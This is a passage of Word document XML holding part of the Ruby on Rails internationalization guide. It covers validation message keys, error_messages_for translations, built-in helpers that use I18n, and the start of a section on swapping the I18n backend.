          </w:tcPr>
          <w:p w14:paraId="6D5EA6AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">numericality </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="632D74AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:less_than </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="61E1AFF1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:less_than </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A279901" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="40E32A21" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="544AB211" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">numericality </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="509E2718" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:less_than_or_equal_to </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5E4E934B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:less_than_or_equal_to </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07757A58" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="5C1EB0AB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="65D41B9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">numericality </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="153437E5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:odd </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0F510836" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:odd </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32B4C60D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="3FF5ECBE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="206C890F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">numericality </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7ED2BE5E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:even </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75DE05A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:even </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="618B818D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="58880BCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.1.3 Translations for the Active Record </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>error_messages_for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Helper</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76392B42" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you are using the Active Record </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>error_messages_for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper, you will want to add translations for it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3D6BE1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails ships with the following translations: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0F51ADE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7160559A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>en:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17C0DDFF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  activerecord:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D114C96" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    errors:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BB4053C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      template:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4439BA78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        header:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75B3682E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>          one:   "1 error prohibited this %{model} from being saved"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EB09DB3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>          other: "%{count} errors prohibited this %{model} from being saved"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="589ED8EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        body:    "There were problems with the following fields:"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3614B2E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 Overview of Other Built-In Methods that Provide I18n Support</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531F41B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails uses fixed strings and other localizations, such as format strings and other format information in a couple of helpers. Here’s a brief overview.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712923D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.1 Action View Helper Methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5250831C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="299"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>distance_of_time_in_words</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> translates and pluralizes its result and interpolates the number of seconds, minutes, hours, and so on. See </w:t>
      </w:r>
      <w:hyperlink r:id="rId561" w:anchor="L51" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>datetime.distance_in_words</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> translations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C2B631" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="300"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>datetime_select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>select_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> use translated month names for populating the resulting select tag. See </w:t>
      </w:r>
      <w:hyperlink r:id="rId562" w:anchor="L15" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>date.month_names</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> for translations. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>datetime_select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> also looks up the order option from </w:t>
      </w:r>
      <w:hyperlink r:id="rId563" w:anchor="L18" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>date.order</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> (unless you pass the option explicitly). All date selection helpers translate the prompt using the translations in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId564" w:anchor="L83" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>datetime.prompts</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> scope if applicable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D45AA7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="301"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>number_to_currency</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>number_with_precision</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>number_to_percentage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>number_with_delimiter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>number_to_human_size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helpers use the number format settings located in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId565" w:anchor="L2" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>number</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> scope.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A6A563" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.2 Active Model Methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E23B64E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="302"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>model_name.human</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>human_attribute_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> use translations for model names and attribute names if available in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId566" w:anchor="L29" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>activerecord.models</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> scope. They also support translations for inherited class names (e.g. for use with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>STI</w:t>
      </w:r>
      <w:r>
        <w:t>) as explained above in “Error message scopes”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B15CB8B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="303"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveModel::Errors#generate_message</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (which is used by Active Model validations but may also be used manually) uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>model_name.human</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>human_attribute_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (see above). It also translates the error message and supports translations for inherited class names as explained above in “Error message scopes”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2E5B0D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="304"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveModel::Errors#full_messages</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> prepends the attribute name to the error message using a separator that will be looked up from </w:t>
      </w:r>
      <w:hyperlink r:id="rId567" w:anchor="L4" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>errors.format</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> (and which defaults to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>"%{attribute} %{message}"</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6367ED78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.3 Active Support Methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250DF614" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="305"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array#to_sentence</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> uses format settings as given in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId568" w:anchor="L30" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>support.array</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> scope.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A61CCF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>6 Customize your I18n Setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36ABE5E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 Using Different Backends</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B9E9072" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For several reasons the Simple backend shipped with Active Support only does the “simplest thing that could possibly work” </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>for Ruby on Rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId569" w:anchor="fn3" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
            <w:vertAlign w:val="superscript"/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> … which means that it is only guaranteed to work for English and, as a side effect, languages that are very similar to English. Also, the simple backend is only capable of reading translations but can not dynamically store them to any format.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D186FF6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>That does not mean you’re stuck with these limitations, though. The Ruby I18n gem makes it very easy to exchange the Simple backend implementation with something else that fits better for your needs. E.g. you could exchange it with Globalize’s Static backend:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="79DBF0B5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D8BDE4B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1994140103"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.backend = Globalize::Backend::Static.new</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05AE4D90" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
